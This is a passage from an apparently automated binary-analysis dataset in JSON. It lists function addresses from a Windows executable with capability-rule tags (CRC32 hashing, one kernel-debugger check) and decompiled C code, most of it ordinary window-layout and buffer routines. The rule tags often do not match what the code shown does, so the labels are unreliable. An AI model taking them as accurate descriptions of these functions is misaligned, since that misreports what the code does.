uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.00418d36(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.00418d36(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.00418d36(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 1796
    },
    "0041c250": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041c250(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (arg_18h != 0) {\n        arg_18h = *(arg_18h + 4);\n    }\n    uVar1 = (*_sym.imp.USER32.dll_ScrollWindowEx)\n                      (*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if ((*(in_ECX + 0x4c) != 0) && ((arg_20h & 1) != 0)) {\n        (**(**(in_ECX + 0x4c) + 0x5c))(arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 232
    },
    "0041c79d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c79d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.0041c17e();\n    puVar4 = &var_8h;\n    fcn.0041c17e(puVar4);\n    do {\n        iVar1 = var_4h;\n        if (var_4h == 0) {\n            puVar3 = &var_10h;\ncode_r0x0041c7f2:\n            fcn.0041c17e(puVar3, puVar4);\n            return arg_8h;\n        }\n        uVar2 = fcn.0041c0c0();\n        if ((uVar2 >> 0x11 & 1) != 0) {\ncode_r0x0041c7ef:\n            puVar3 = &var_8h;\n            goto code_r0x0041c7f2;\n        }\n        if (var_10h != var_8h) {\n            fcn.00411e42();\n            goto code_r0x0041c7ef;\n        }\n        puVar4 = &var_4h;\n        var_ch = iVar1;\n        fcn.0041c201();\n    } while( true );\n}\n",
        "token_count": 333
    },
    "0041c803": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c803(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0041c17e();\n    fcn.0041c76c(&var_8h, 1);\n    while( true ) {\n        if (var_4h == 0) {\n            return arg_8h;\n        }\n        uVar1 = fcn.0041c0c0();\n        if ((uVar1 >> 0x11 & 1) != 0) break;\n        fcn.0041c1ce();\n        if (*(arg_8h + 4) != 0) {\n            fcn.0041c1ce();\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 186
    },
    "0041c919": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c919(uint param_1)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0041c17e(param_1);\n    bVar1 = false;\n    do {\n        if (((var_4h == 0) || (fcn.0041c1ce(&var_4h),  iVar5 = var_4h,  var_4h == 0)) ||\n           (uVar3 = fcn.0041c0c0(),  (uVar3 >> 0x11 & 1) != 0)) {\n            uVar4 = fcn.0041c79d(&var_10h);\n            fcn.0041c19a(uVar4);\n            if (var_4h == 0) {\n                return;\n            }\n            if (bVar1) {\n                return;\n            }\n            bVar1 = true;\n            iVar5 = var_4h;\n        }\n        cVar2 = fcn.0041c0d9(*(iVar5 + 8));\n        if (cVar2 == '\\0') {\n            fcn.0041c19a(&var_8h);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 316
    },
    "0041c994": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c994(uint param_1)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0041c17e(param_1);\n    bVar1 = false;\n    do {\n        if ((var_4h == 0) || (uVar3 = fcn.0041c0c0(),  (uVar3 >> 0x11 & 1) != 0)) {\n            uVar4 = fcn.0041c803(&var_10h);\n            fcn.0041c19a(uVar4);\n            if (var_4h == 0) {\n                return;\n            }\n            if (bVar1) {\n                return;\n            }\n            bVar1 = true;\n        }\n        else {\n            fcn.0041c201(&var_4h);\n        }\n        if ((var_4h != 0) && (cVar2 = fcn.0041c0d9(*(var_4h + 8)),  cVar2 == '\\0')) {\n            fcn.0041c19a(&var_8h);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 296
    },
    "0041d12e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d12e(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.00411e42();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00410400();\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00429fd7(arg_ch, uVar1 * 4);\n            arg_ch = arg_ch + uVar1 * 4;\n        }\n    }\n    return;\n}\n",
        "token_count": 305
    },
    "0041d2c2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041d2c2(uint param_1, uint8_t param_2)\n\n{\n    fcn.00402740();\n    if ((param_2 & 1) != 0) {\n        fcn.004115a4(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 71
    },
    "0041d433": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041d433(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.004627e2(8);\n    iVar2 = *(unaff_EBP + 8) * 0x14 + extraout_ECX[0x1e];\n    if ((*(iVar2 + 0xc) & 1) == 0) {\n        if (*(unaff_EBP + 0xc) == 0) {\n            iVar1 = *(*(iVar2 + 0x10) + -0xc);\n        }\n        else {\n            iVar1 = fcn.004126f7(*(unaff_EBP + 0xc));\n        }\n        if (iVar1 == 0) goto code_r0x0041d4d6;\n    }\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + 0xc) == 0) {\n        fcn.0041372f();\n    }\n    else {\n        fcn.00413a3a();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) == 0) {\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) | 1;\n    }\n    else {\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) & 0xfffffffe;\n        if ((*(iVar2 + 8) & 0x4000000) == 0) {\n            uVar3 = *(iVar2 + 0x10);\n        }\n        else {\n            uVar3 = 0;\n        }\n        (**(*extraout_ECX + 0x110))(0x401, *(iVar2 + 8) | *(unaff_EBP + 8), uVar3);\n    }\ncode_r0x0041d4d6:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 494
    },
    "0041d51e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: lpRect\n// WARNING: Variable defined which should be unmapped: dy\n\nvoid __cdecl fcn.0041d51e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint *puVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t lpRect;\n    uint dy;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x38);\n    if (*(unaff_EBP + 8) != 0) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(extraout_ECX[8], unaff_EBP + -0x30);\n        (*_sym.imp.USER32.dll_OffsetRect)(unaff_EBP + -0x30, -*(unaff_EBP + -0x30), -*(unaff_EBP + -0x2c));\n        (**(*extraout_ECX + 0x140))(unaff_EBP + -0x30, 1);\n        (**(*extraout_ECX + 0x110))(0x407, 0, unaff_EBP + -0x20);\n        lpRect = extraout_ECX[0x1d];\n        iVar6 = (*(unaff_EBP + -0x28) - *(unaff_EBP + -0x30)) + *(unaff_EBP + -0x18);\n        iVar5 = extraout_ECX[0x1e];\n        *(unaff_EBP + 8) = 0;\n        if (0 < lpRect) {\n            piVar4 = iVar5 + 4;\n            *(unaff_EBP + -0x14) = lpRect;\n            do {\n                if ((piVar4[1] & 0x8000000U) != 0) {\n                    *(unaff_EBP + 8) = *(unaff_EBP + 8) + 1;\n                }\n                iVar5 = *piVar4;\n                piVar4 = piVar4 + 5;\n                iVar6 = iVar6 + ((-6 - iVar5) - *(unaff_EBP + -0x18));\n                piVar1 = unaff_EBP + -0x14;\n                *piVar1 = *piVar1 + -1;\n            } while (*piVar1 != 0);\n        }\n        *(unaff_EBP + -0x44) = vtable.CArray_int__int_const__.0;\n        *(unaff_EBP + -0x40) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x3c) = 0;\n        *(unaff_EBP + -4) = 0;\n        fcn.0041cfbf(lpRect, 0xffffffff);\n        *(unaff_EBP + -0x10) = 0;\n        iVar5 = *(unaff_EBP + -0x20);\n        if (0 < extraout_ECX[0x1d]) {\n            puVar2 = extraout_ECX[0x1e] + 8;\n            *(unaff_EBP + -0x14) = puVar2;\n            while( true ) {\n                iVar5 = iVar5 + 6 + puVar2[-1];\n                if (((*puVar2 & 0x8000000) != 0) && (0 < iVar6)) {\n                    iVar3 = iVar6 / *(unaff_EBP + 8);\n                    iVar5 = iVar5 + iVar3;\n                    *(unaff_EBP + 8) = *(unaff_EBP + 8) + -1;\n                    iVar6 = iVar6 - iVar3;\n                }\n                lpRect = *(unaff_EBP + -0x10);\n                piVar4 = fcn.0041ccea();\n                *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x14;\n                *piVar4 = iVar5;\n                iVar5 = iVar5 + *(unaff_EBP + -0x18);\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 1;\n                if (extraout_ECX[0x1d] <= *(unaff_EBP + -0x10)) break;\n                puVar2 = *(unaff_EBP + -0x14);\n            }\n        }\n        (**(*extraout_ECX + 0x110))(0x404, extraout_ECX[0x1d], *(unaff_EBP + -0x40), lpRect);\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041d0fd();\n    }\n    iVar5 = 0;\n    if ((*(unaff_EBP + 0xc) != 0) && (0 < extraout_ECX[0x1d])) {\n        puVar7 = extraout_ECX[0x1e] + 0x10;\n        do {\n            if ((*(puVar7 + -1) & 1) != 0) {\n                fcn.0041d433(iVar5, *puVar7, 1);\n            }\n            puVar7 = puVar7 + 5;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < extraout_ECX[0x1d]);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 1472
    },
    "0041dc20": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041dc20(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *var_8h;\n    int32_t *piStack8;\n    \n    uVar1 = param_1[0x20];\n    param_1[0x28] = 0;\n    if (((uVar1 & 1) == 0) || ((uVar1 & 4) == 0)) {\n        if ((uVar1 & 0xa000) == 0) {\n            uVar2 = 0x50;\n        }\n        else {\n            uVar2 = 0x4a;\n        }\n    }\n    else {\n        uVar2 = 0x46;\n    }\n    var_8h = param_1;\n    piStack8 = param_1;\n    (**(*param_1 + 0x138))(&var_8h, 0, uVar2);\n    return;\n}\n",
        "token_count": 218
    },
    "0041dc9e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041dc9e(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    iVar6 = 0;\n    var_4h = 0;\n    if (arg_ch < 1) {\ncode_r0x0041dd61:\n        return var_4h + 1;\n    }\ncode_r0x0041dcbc:\n    piVar1 = iVar3 * 0x14 + arg_8h;\n    piVar4 = piVar1 + 2;\n    *piVar4 = *piVar4 & 0xdf;\n    if ((*piVar4 & 8) == 0) {\n        if ((*(piVar1 + 9) & 1) == 0) {\n            iVar2 = *(in_ECX + 0xac);\n        }\n        else {\n            iVar2 = *piVar1;\n        }\n        iVar6 = iVar6 + iVar2;\n        iVar2 = iVar3;\n        if (arg_10h < iVar6) {\n            for (; (-1 < iVar2 && ((*piVar4 & 0x20) == 0)); piVar4 = piVar4 + -5) {\n                if (((*(piVar4 + 1) & 1) != 0) && ((piVar4[-1] == 0 && ((*piVar4 & 8) == 0)))) goto code_r0x0041dd44;\n                iVar2 = iVar2 + -1;\n            }\n            iVar2 = iVar3 + -1;\n            if (-1 < iVar2) {\n                puVar5 = iVar2 * 0x14 + 8 + arg_8h;\n                do {\n                    if ((*puVar5 & 0x20) != 0) break;\n                    if (((*puVar5 & 8) == 0) && (((puVar5[1] & 1) == 0 || (*(puVar5 + -4) == 0))))\n                    goto code_r0x0041dd44;\n                    iVar2 = iVar2 + -1;\n                    puVar5 = puVar5 + -0x14;\n                } while (-1 < iVar2);\n            }\n        }\n    }\n    goto code_r0x0041dd55;\ncode_r0x0041dd44:\n    puVar5 = iVar2 * 0x14 + 8 + arg_8h;\n    *puVar5 = *puVar5 | 0x20;\n    iVar6 = 0;\n    var_4h = var_4h + 1;\n    iVar3 = iVar2;\ncode_r0x0041dd55:\n    iVar3 = iVar3 + 1;\n    if (arg_ch <= iVar3) goto code_r0x0041dd61;\n    goto code_r0x0041dcbc;\n}\n",
        "token_count": 700
    },
    "0041e603": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041e603(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar7 = *in_ECX;\n    var_ch = 0;\n    var_8h = 0;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    uVar2 = (**(iVar7 + 0x110))(0x455, 0, 0);\n    if (0 < arg_10h) {\n        puVar8 = arg_ch + 9;\n        arg_ch = arg_10h;\n        do {\n            arg_10h = *(puVar8 + -9);\n            uVar3 = fcn.0041be35();\n            if (((uVar3 & 0x800) == 0) && (*0x4b66f8 != 0x40047)) {\n                arg_10h = (arg_10h * 2) / 3;\n            }\n            if ((puVar8[-1] & 8) == 0) {\n                uVar1 = *puVar8;\n                iVar7 = in_ECX[0x2b];\n                if ((uVar1 & 1) == 0) {\n                    if (((uVar1 & 8) != 0) && ((uVar2 & 1) != 0)) {\n                        iVar7 = iVar7 + *0x4b66fc;\n                    }\n                    iVar4 = var_ch + iVar7;\n                    if (var_ch + iVar7 <= *arg_8h) {\n                        iVar4 = *arg_8h;\n                    }\n                    *arg_8h = iVar4;\n                    iVar4 = in_ECX[0x2c];\n                    iVar6 = var_8h;\ncode_r0x0041e6dc:\n                    iVar5 = iVar4 + iVar6;\n                    if (iVar4 + iVar6 <= arg_8h[1]) {\n                        iVar5 = arg_8h[1];\n                    }\n                    arg_8h[1] = iVar5;\n                }\n                else {\n                    if ((puVar8[-1] & 0x20) != 0) {\n                        iVar4 = in_ECX[0x2c] + var_8h;\n                        iVar6 = arg_10h;\n                        goto code_r0x0041e6dc;\n                    }\n                    iVar4 = *(puVar8 + -9) + var_ch;\n                    if (*(puVar8 + -9) + var_ch <= *arg_8h) {\n                        iVar4 = *arg_8h;\n                    }\n                    *arg_8h = iVar4;\n                }\n                if ((uVar1 & 1) != 0) {\n                    iVar7 = *(puVar8 + -9);\n                }\n                var_ch = var_ch + iVar7;\n                if ((puVar8[-1] & 0x20) != 0) {\n                    var_8h = var_8h + in_ECX[0x2c];\n                    var_ch = 0;\n                    if ((uVar1 & 1) != 0) {\n                        var_8h = var_8h + arg_10h;\n                    }\n                }\n            }\n            puVar8 = puVar8 + 0x14;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 847
    },
    "0042023e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042023e(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar3 = fcn.0041be35();\n    iVar4 = param_1;\n    if ((uVar3 & 0x40000000) == 0) {\n        iVar4 = fcn.00419182();\n    }\n    if (iVar4 == 0) {\n        fcn.00411e42();\n    }\n    pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n    if ((param_2 & 0xc) != 0) {\n        iVar5 = fcn.0041bf9b();\n        if ((((~(param_2 >> 3) & 1) == 0) || (iVar5 == 0)) || (iVar4 == param_1)) {\n            (*pcVar2)(*(iVar4 + 0x20), 0x86, 0, 0);\n        }\n        else {\n            *(param_1 + 0x3c) = *(param_1 + 0x3c) | 0x200;\n            (*pcVar2)(*(iVar4 + 0x20), 0x86, 1, 0);\n            *(param_1 + 0x3c) = *(param_1 + 0x3c) & 0xfffffdff;\n        }\n    }\n    uVar7 = 5;\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)(5);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    while (iVar5 = (*pcVar1)(iVar5, uVar7),  iVar5 != 0) {\n        iVar6 = fcn.0041f790(*(iVar4 + 0x20), iVar5);\n        if (iVar6 != 0) {\n            (*pcVar2)(iVar5, 0x36d, param_2, 0);\n        }\n        uVar7 = 2;\n    }\n    return;\n}\n",
        "token_count": 491
    },
    "00421745": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421745(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.00411e42();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00410400();\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00429fd7(arg_ch, uVar1 * 4);\n            arg_ch = arg_ch + uVar1 * 4;\n        }\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "00421f9b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00421f9b(uint param_1, uint *param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *puVar5;\n    uint32_t uStack280;\n    uint *puStack276;\n    uint32_t uStack272;\n    uint uStack268;\n    uint arg_8h;\n    \n    arg_8h = 0xc;\n    uStack268 = 0x421fbf;\n    fcn.004627af();\n    if (param_2 != NULL) goto code_r0x00421fe0;\n    do {\n        uStack268 = 0x421fe0;\n        param_3 = fcn.00411e42();\ncode_r0x00421fe0:\n    } while (param_3 == 0);\n    uStack268 = 0x421ff2;\n    uStack268 = fcn.0042407a();\n    uStack272 = 0x421ffb;\n    fcn.0040f840();\n    uVar2 = param_2[1];\n    uStack268 = 0;\n    if (((param_2[2] == -0x208) && ((*(param_2 + 0x19) & 1) != 0)) ||\n       ((param_2[2] == -0x212 && ((*(param_2 + 0x2d) & 1) != 0)))) {\n        puStack276 = 0x42202a;\n        uStack272 = uVar2;\n        uVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)();\n        uVar2 = uVar2 & 0xffff;\n    }\n    if (uVar2 != 0) {\n        uStack272 = 0x100;\n        uStack280 = uVar2;\n        puStack276 = &stack0xfffffef8;\n        iVar3 = fcn.00423ed7();\n        if (iVar3 == 0) {\n            fcn.00402740();\n            goto code_r0x004220e5;\n        }\n        fcn.00423f9a(&stack0xfffffee8, &stack0xfffffef8, 1, 10);\n    }\n    if (param_2[2] == -0x208) {\n        uStack272 = 0xffffffff;\n        puStack276 = uStack280;\n        uStack280 = 0x50;\n        puVar5 = 0x42207c;\n        fcn.0041fb11(param_2 + 4);\n    }\n    else {\n        puVar1 = param_2 + 4;\n        uStack272 = 0x422090;\n        uVar2 = uStack280;\n        uVar4 = (**0x4b94e8)();\n        uStack272 = 0x50;\n        uStack280 = 0xffffffff;\n        puVar5 = NULL;\n        puStack276 = puVar1;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar4, 0, uVar2);\n        if ((puVar1 != NULL) && (0x50 < iVar3)) {\n            uStack268 = 0x80004005;\n            puStack276 = 0x4220b3;\n            iVar3 = fcn.00401280();\n        }\n        if ((0 < iVar3) && (puVar1 != NULL)) {\n            *(param_2 + iVar3 * 2 + 0xe) = 0;\n        }\n    }\n    uStack272 = 0x213;\n    puStack276 = NULL;\n    uStack280 = 0;\n    *puVar5 = 0;\n    (*_sym.imp.USER32.dll_SetWindowPos)(*param_2, 0, 0, 0);\n    fcn.00402740();\ncode_r0x004220e5:\n    *in_FS_OFFSET = puStack276;\n    uStack268 = 0x422100;\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 910
    },
    "0042378f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042378f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((*(arg_8h + 0x18) & 1) == 0) {\n        iVar1 = fcn.004236bf(&var_10h);\n        if (iVar1 != 0) {\n            uVar2 = fcn.0041be35();\n            if ((uVar2 & 0x1000000) != 0) {\n                uVar3 = fcn.0041be4f();\n                uVar3 = fcn.0041be35(0, uVar3);\n                (*_sym.imp.USER32.dll_AdjustWindowRectEx)(&var_10h, uVar3);\n                *(arg_8h + 8) = var_10h;\n                *(arg_8h + 0xc) = var_ch;\n                *(arg_8h + 0x10) = var_8h - var_10h;\n                *(arg_8h + 0x14) = var_4h - var_ch;\n            }\n        }\n    }\n    fcn.00418521();\n    return;\n}\n",
        "token_count": 306
    },
    "004243d7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004243d7(uint noname_0, int32_t noname_1, int32_t noname_2, uint noname_3, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    \n    if (noname_2 != 0) {\n        if (noname_1 == 0) {\n            fcn.00411e42();\n        }\n        if ((~*(var_8h + 0x18) & 1) == 0) {\n            do {\n                noname_2 = noname_2 + -1;\n                fcn.0043af48(var_8h, noname_1);\n                noname_1 = noname_1 + 4;\n            } while (noname_2 != 0);\n        }\n        else {\n            do {\n                noname_2 = noname_2 + -1;\n                fcn.00424390();\n                fcn.0043aefb(var_8h, noname_1);\n                noname_1 = noname_1 + 4;\n            } while (noname_2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00429a49": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00429a49(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.004299a5(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.0041314e(arg_8h, arg_ch, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.0041314e(arg_8h, uVar3, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 939
    },
    "00429b78": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
